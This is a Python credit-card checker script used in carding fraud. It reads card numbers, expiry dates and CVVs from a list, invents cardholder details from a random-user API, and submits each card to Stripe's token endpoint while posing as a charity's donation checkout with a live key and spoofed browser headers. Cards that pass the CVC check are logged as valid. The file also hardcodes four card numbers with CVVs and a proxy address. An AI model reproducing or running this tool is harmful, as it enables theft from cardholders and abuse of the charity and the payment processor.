import os
import json
import requests


succcess = open("cvc.txt","a")
checked = open("checkcards.txt","a")
othercards = open("othercards.txt","a")

def getnumber():
    read = open("num.txt","r")
    lines = read.readlines()
    num = int(lines[0])
    return num



def increment():
    read = open("num.txt","r")

    lines = read.readlines()
    num = int(lines[0])
    num = num +1
    write = open("num.txt", "w")
    write.write(str(num))
    read.close()
    write.close()

def decrement():
    read = open("num.txt", "r")

    lines = read.readlines()
    num = int(lines[0])
    num = num - 1
    write = open("num.txt", "w")
    write.write(str(num))
    read.close()
    write.close()

def randomizer():
    randomocontent = requests.get('https://randomuser.me/api/1.2/?nat=us')
    jsonrandom = randomocontent.json()
    #print(jsonrandom["results"][0]["location"]["state"])
    return jsonrandom


def checker(cc,jsonrandom):
    splitter = cc.split('|')
    ccnum = splitter[0]
    month = splitter[1]
    year = splitter[2]
    cvv = splitter[3]

    muid = '14bec475-2279-4ba5-87ce-1b4c2bf2dd04'
    sid = '731a3414-ff88-440a-b64e-f77a878f71b2'

    firstname = jsonrandom["results"][0]["name"]["first"]
    lastname = jsonrandom["results"][0]["name"]["last"]
    street = jsonrandom["results"][0]["location"]["street"]

    city = jsonrandom["results"][0]["location"]["city"]

    postcode = jsonrandom["results"][0]["location"]["postcode"]

    email = jsonrandom["results"][0]["email"]

    state = jsonrandom["results"][0]["location"]["state"]


    #print(cvv)

    url  = 'https://api.stripe.com/v1/tokens'
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'origin': 'https://checkout.stripe.com',
        'sec-fetch-dest': 'empty',
        'accept-language': 'en-GB',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'referer': 'https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=31d5b0c4-70c8-d34b-8f08-71046ff10298',
    }

    data = {
    'email': email,
    'validation_type': 'card',
    'payment_user_agent': 'Stripe Checkout v3 checkout-manhattan (stripe.js/a44017d)',
    'referrer': 'https://www.tangaroablue.org/about-us/donate/',
    'pasted_fields': 'number',
    'card[number]': ccnum,
    'card[exp_month]': month,
    'card[exp_year]': year,
    'card[cvc]': cvv,
    'card[name]': firstname,
    'card[address_line1]': street,
    'card[address_city]': city ,
    'card[address_state]': state,
    'card[address_zip]': postcode,
    'card[address_country]': 'United States',
    'time_on_page': '132527',
    'guid': 'NA',
    'muid': muid,#'9765dc7f-a003-43fb-9999-5602351ba3cc',
    'sid':  sid,#'6a909e32-d576-4bac-bf88-5372ac3e3ead',
    'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
    }
    proxydict = {'http':'http://192.225.214.132:80','https':'http://192.225.214.132:80'}
    responser = requests.post(url,headers=headers,data=data)
    #print(responser)
    #print(responser.status_code)
    jsonrespone = responser.json()
    if(responser.status_code == 200):
        #print("CC is Valid")
        if(jsonrespone["card"]["cvc_check"] == "unavailable"):
            print("Proxy Error")
            decrement()



        #CHECKING IF THE CARD HAS THE CORRECT CVC
        elif(jsonrespone["card"]["cvc_check"] == "pass"):
            checked.write(cc)
            checked.write('\n')
            print("CVC CHECK PASS")
            succcess.write(cc+"-----")
            succcess.write(responser.text)
            print(cc)


        elif(jsonrespone["card"]["cvc_check"] == "unchecked"):
            checked.write(cc)
            checked.write('\n')
            decrement()


        print(jsonrespone["card"]["cvc_check"])
        #print(cc)
        #print(jsonrespone)
    elif (responser.status_code == 402):
        if(jsonrespone["error"]["code"] == "incorrect_cvc"):
            print("CCN")
            checked.write(cc)
            checked.write('\n')
            succcess.write(cc+"----")
            succcess.write(responser.text)
        elif(jsonrespone["error"]["code"] == "card_declined"):
            checked.write(cc)
            checked.write('\n')
            othercards.write(cc)
            othercards.write(responser.text)
            othercards.write("------------------------------------------------------------------------")


        print(jsonrespone)

    print(jsonrespone)


cc = '379286712851003|06|2023|8742'
cc1 = '379286837451002|07|2023|1856'
cc2 = '379286484061005|10|2023|5780'
cc3 = '379286802261006|11|2025|5021'

#checker(cc3,randomizer())
#checker(cc2,randomizer())
#checker(cc1,randomizer())
#checker(cc,randomizer())
#checker()

def split(cc):
    splitones = cc.split('|')
    print(splitones[0])



#split('32176321|3213|321')



def main():
    f = open('list.txt', 'r')
    lines = f.readlines()
    num = getnumber()
    f.close()

    for x in range(0,100):
        cc = lines[num]
        cc = cc[0:28]

        #print(f.read(29))
        #print(cc)

        checker(cc,randomizer())
        increment()



        print('--------------------------------------------------------------------'+str(num)+'------------------------------------------')
        num = num + 1
        #cc = str(f.read(x))
        #print(cc)

#main()
main()






#firstname = jsonrandom["results"][0]["name"]["first"]


#lastname = jsonrandom["results"][0]["name"]["last"]
#street = jsonrandom["results"][0]["location"]["street"]
#city = jsonrandom["results"][0]["location"]["city"]
#postcode = jsonrandom["results"][0]["location"]["postcode"]
#email  = jsonrandom["results"][0]["email"]
#state = jsonrandom["results"][0]["location"]["state"]




#randomizer()